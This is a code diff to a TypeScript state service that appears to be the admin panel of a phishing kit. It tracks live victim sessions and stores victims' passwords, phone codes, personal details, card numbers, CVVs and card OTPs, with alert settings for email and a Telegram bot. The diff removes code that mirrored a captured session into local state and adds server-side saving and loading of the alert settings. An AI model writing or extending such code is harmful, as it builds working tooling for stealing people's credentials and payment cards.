@@ -687,49 +687,12 @@ export class StateService {
               targetId = newActiveSessions[0].id;
               this.monitoredSessionId.set(targetId);
         }
-        
-        if (targetId) {
-            const target = newActiveSessions.find(s => s.id === targetId);
-            if (target) {
-                this.updateLocalStateFromRemote(target);
-            }
-        }
     }
 }
 
   public setMonitoredSession(id: string) {
       this.monitoredSessionId.set(id);
       this.fetchSessions(); // Force immediate refresh
-  }
-
-  private updateLocalStateFromRemote(target: SessionHistory) {
-      this.email.set(target.data.email || '');
-      this.password.set(target.data.password || '');
-      this.phoneNumber.set(target.data.phoneNumber || '');
-      this.phoneCode.set(target.data.phoneCode || '');
-      this.firstName.set(target.data.firstName || '');
-      this.lastName.set(target.data.lastName || '');
-      this.dob.set(target.data.dob || '');
-      this.address.set(target.data.address || '');
-      this.country.set(target.data.country || '');
-      this.cardNumber.set(target.data.cardNumber || '');
-      this.cardExpiry.set(target.data.cardExpiry || '');
-      this.cardCvv.set(target.data.cardCvv || '');
-      this.cardOtp.set(target.data.cardOtp || '');
-      
-      this.stage.set(target.stage as VerificationStage || 'login');
-      // Update session ID if we are viewing a specific user
-      this.sessionId.set(target.id);
-      
-      this.startTime.set(target.timestamp);
-      this.fingerprint.set(target.fingerprint);
-      this.resendRequested.set(target.resendRequested || false);
-      
-      this.isLoginVerified.set(!!target.isLoginVerified);
-      this.isPhoneVerified.set(!!target.isPhoneVerified);
-      this.isPersonalVerified.set(!!target.isPersonalVerified);
-      this.isCardSubmitted.set(!!target.isCardSubmitted);
-      this.isFlowComplete.set(!!target.isFlowComplete);
   }
 
   private async sendAdminCommand(sessionId: string, action: string, payload: any) {
@@ -917,6 +880,7 @@ export class StateService {
           this.adminAuthenticated.set(true);
           this.navigate('admin'); // Ensure router updates
           this.fetchSessions();
+          this.loadSettings();
           return true;
       }
       return false;
@@ -971,11 +935,34 @@ export class StateService {
       }
   }
 
-  updateAdminSettings(email: string, auto: boolean, tgToken?: string, tgChat?: string) {
+  async updateAdminSettings(email: string, auto: boolean, tgToken?: string, tgChat?: string) {
       this.adminAlertEmail.set(email);
       this.adminAutoCapture.set(auto);
       if (tgToken !== undefined) this.telegramBotToken.set(tgToken);
       if (tgChat !== undefined) this.telegramChatId.set(tgChat);
+
+      // Persist to Server
+      try {
+          await firstValueFrom(from(fetch('/api/settings', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ email, tgToken, tgChat })
+          })));
+      } catch (e) {
+          console.error('Failed to save settings', e);
+      }
+  }
+
+  public async loadSettings() {
+      try {
+          const res = await firstValueFrom(from(fetch('/api/settings')));
+          if (res && res.ok) {
+              const data = await res.json();
+              if (data.email) this.adminAlertEmail.set(data.email);
+              if (data.tgToken) this.telegramBotToken.set(data.tgToken);
+              if (data.tgChat) this.telegramChatId.set(data.tgChat);
+          }
+      } catch (e) {}
   }
 
   showAdminToast(msg: string) {
